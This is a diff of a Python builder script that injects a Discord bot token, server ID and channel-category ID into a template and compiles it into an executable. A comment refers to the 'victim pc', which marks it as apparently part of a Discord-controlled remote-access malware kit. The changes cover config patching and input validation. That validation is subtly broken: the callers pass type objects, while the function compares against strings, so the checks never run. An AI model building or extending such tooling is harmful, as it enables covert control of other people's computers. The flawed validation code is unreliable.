@@ -3,8 +3,6 @@ import sys
 import os
 import shutil
 
-# TODO: fix this
-
 def install(package):
     subprocess.check_call([sys.executable, "-m", "pip", "install", package])
 
@@ -13,17 +11,15 @@ def create_cache(TOKEN, SERVER_ID, CATEGORY_ID):
     with open("main-developer.py", "r", encoding="utf-8") as f:
         data = f.readlines()
 
-    # lines that requires input:
-    ltri = [72, 73, 74]
-    configs = [TOKEN, SERVER_ID, CATEGORY_ID]
-    for i in range(3):
-        data[ltri[i]-1] = data[ltri[i]-1].replace("''", f"'{configs[i]}'") # very ugly, very nice xD
+    # lines that requires string input:
+    ltrsi = [72]
+    data[ltrsi[0]-1] = data[ltrsi[0]-1].replace("''", f"'{TOKEN}'") # very ugly, very nice xD
 
-    # lines that need to remove value:
-    ltntrv = [76]
-    for i in ltntrv:
-        line = data[i-1].split("=")
-        data[i-1] = line[0] + "= ''\n"
+    # lines that requires integer input:
+    ltrii = [73, 74]
+    config = [SERVER_ID, CATEGORY_ID]
+    for i in range(len(ltrii)):
+        data[ltrii[i]-1] = data[ltrii[i]-1].replace("0", f"{config[i]}") # very ugly, very nice xD
 
     # lines that need to indent once
     data[28-1] = "    " + data[28-1]
@@ -46,7 +42,7 @@ def create_cache(TOKEN, SERVER_ID, CATEGORY_ID):
         data[i-1] = line[1:]
 
     # lines that need to be deleted:
-    ltntbd = [22, 30, 31, 61, 62, 86, 106, 113, 147, 153, 181, 234, 511, 597]
+    ltntbd = [22, 30, 31, 61, 62, 76, 86, 106, 113, 147, 153, 181, 234, 511, 597]
     for i in range(0, len(ltntbd)):
         data.pop(ltntbd[i]-(i+1))
 
@@ -66,11 +62,20 @@ def build(TOKEN, SERVER_ID, CATEGORY_ID, ICON):
     shutil.rmtree("./build")
 
 
-def interrogate_i_mean_ask(message):
+def interrogate_i_mean_ask(message, datatype):
     value = None
-    while not value:
+    while True:
         value = input(f"Enter your {message}: ")
-        if not value:
+        if value:
+            try:
+                if datatype == "str":
+                    str(value)
+                elif datatype == "int":
+                    int(value)
+                break
+            except ValueError:
+                print(f"Please enter a valid {message}")
+        else:
             print(f"Please enter a valid {message}")
 
     return value
@@ -99,9 +104,9 @@ for necessary in necessary_packages:
                 quit()
 
 print('\n')
-token = interrogate_i_mean_ask("token")
-guild_id = interrogate_i_mean_ask("server ID")
-category_id = interrogate_i_mean_ask("category ID (This is for creating channel)")
+token = interrogate_i_mean_ask("token", str)
+guild_id = interrogate_i_mean_ask("server ID", int)
+category_id = interrogate_i_mean_ask("category ID (This is for creating channel)", int)
 # leave blank to set as victim pc's process  TODO: achieve this function
 icon = str(input("Enter icon path ( leave blank to set as icon.ico ): "))
 
